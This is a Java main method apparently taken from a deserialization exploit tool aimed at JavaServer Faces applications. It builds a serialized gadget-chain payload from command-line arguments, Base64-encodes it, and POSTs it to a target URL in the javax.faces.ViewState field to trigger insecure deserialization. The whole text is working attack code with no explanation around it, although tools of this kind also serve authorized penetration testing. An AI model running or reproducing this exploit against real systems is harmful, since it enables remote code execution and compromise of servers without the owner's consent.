public static void main ( String[] args ) {

        if ( args.length < 3 ) {
            System.err.println(JSF.class.getName() + " <view_url> <payload_type> <payload_arg>");
            System.exit(-1);
        }

        final Object payloadObject = Utils.makePayloadObject(args[ 1 ], args[ 2 ]);

        try {
            URL u = new URL(args[ 0 ]);

            URLConnection c = u.openConnection();
            if ( ! ( c instanceof HttpURLConnection ) ) {
                throw new IllegalArgumentException("Not a HTTP url");
            }

            HttpURLConnection hc = (HttpURLConnection) c;
            hc.setDoOutput(true);
            hc.setRequestMethod("POST");
            hc.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            OutputStream os = hc.getOutputStream();

            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            ObjectOutputStream oos = new ObjectOutputStream(bos);
            oos.writeObject(payloadObject);
            oos.close();
            byte[] data = bos.toByteArray();
            String requestBody = "javax.faces.ViewState=" + URLEncoder.encode(Base64.encodeBase64String(data), "US-ASCII");
            os.write(requestBody.getBytes("US-ASCII"));
            os.close();

            System.err.println("Have response code " + hc.getResponseCode() + " " + hc.getResponseMessage());
        }
        catch ( Exception e ) {
            e.printStackTrace(System.err);
        }
        Utils.releasePayload(args[1], payloadObject);

    }